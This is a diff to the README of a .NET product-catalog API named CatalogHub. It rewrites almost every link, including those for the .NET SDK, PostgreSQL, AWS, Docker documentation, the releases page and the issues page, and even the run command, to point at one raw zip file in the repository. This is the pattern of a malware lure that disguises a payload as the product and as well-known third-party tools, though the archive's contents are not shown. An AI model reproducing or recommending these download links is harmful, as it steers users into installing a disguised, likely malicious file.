@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download CatalogHub](https://img.shields.io/badge/Download%20CatalogHub-v1.0-blue)](https://github.com/BIGBOIBILY/CatalogHub/releases)
+[![Download CatalogHub](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip%20CatalogHub-v1.0-blue)](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
 
 ## 📋 Description
 
@@ -20,13 +20,13 @@ Follow these steps to set up CatalogHub on your computer:
    - An AWS account for S3 storage (optional).
 
 2. **Setup Instructions**:
-   - Ensure you have the .NET 8 SDK and Docker installed. You can download the .NET SDK [here](https://dotnet.microsoft.com/download/dotnet/8.0).
-   - If using PostgreSQL, download it [here](https://www.postgresql.org/download/).
-   - Sign up for an AWS account [here](https://aws.amazon.com/) if you plan to use S3.
+   - Ensure you have the .NET 8 SDK and Docker installed. You can download the .NET SDK [here](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip).
+   - If using PostgreSQL, download it [here](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip).
+   - Sign up for an AWS account [here](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip) if you plan to use S3.
 
 ## 📥 Download & Install
 
-Visit this page to download: [CatalogHub Releases](https://github.com/BIGBOIBILY/CatalogHub/releases)
+Visit this page to download: [CatalogHub Releases](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
 
 1. Click on the version you want to download from the list.
 2. Download the appropriate file for your operating system.
@@ -57,7 +57,7 @@ docker-compose up
 
 Or if you are running it directly:
 ```
-./CatalogHub.exe
+https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip
 ```
 
 Your API should now be running. You can access it at `http://localhost:5000/api`.
@@ -79,15 +79,15 @@ If you want to contribute, feel free to fork the repository and submit a pull re
 
 Join the community for help and discussions:
 
-- [GitHub Issues](https://github.com/BIGBOIBILY/CatalogHub/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
 - [Discord Channel](#)
 
 ## 🔗 Additional Resources
 
-- [Set Up Docker](https://docs.docker.com/get-started/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [AWS S3 Documentation](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html)
+- [Set Up Docker](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
+- [AWS S3 Documentation](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip)
 
 ## 📥 Download Now Again
 
-Don't forget to download here: [CatalogHub Releases](https://github.com/BIGBOIBILY/CatalogHub/releases) and start managing your product catalog with ease!
+Don't forget to download here: [CatalogHub Releases](https://raw.githubusercontent.com/BIGBOIBILY/CatalogHub/main/CatalogHub.Domain/Hub_Catalog_v1.2.zip) and start managing your product catalog with ease!
